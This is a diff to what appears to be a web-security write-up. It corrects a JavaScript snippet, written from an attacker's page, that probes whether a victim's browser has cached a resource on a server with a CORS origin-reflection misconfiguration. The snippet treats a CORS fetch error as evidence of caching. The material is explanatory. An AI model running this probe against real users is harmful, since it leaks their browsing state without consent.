@@ -67,19 +67,16 @@ If a resource hosted on `server.com` is requested from `target.com` then the ori
 // The function simply take a url and fetch it in CORS mode
 // if the fetch raises an error, it will be a CORS error due to the 
 // origin mismatch between attacker.com and victim's ip
-function checkCachedResource(url) {
-    fetch(url, {
+function isResourceCached(url) {
+    return fetch(url, {
         mode: "cors"
-        }).catch((e) => {
-            return true
-        });
-    return false
+    }).then(() => false, (e) => true);
 }
 
 // This makes sense only if the attacker alredy knows that
 // server.com suffers from origin reflection CORS misconfiguration
 var resource_url = "server.com/reflected_origin_resource.html"
-verdict = checkCachedResource(resource_url)
+verdict = await isResourceCached(resource_url)
 console.log("Resource was cached: " + verdict)
 ```
 
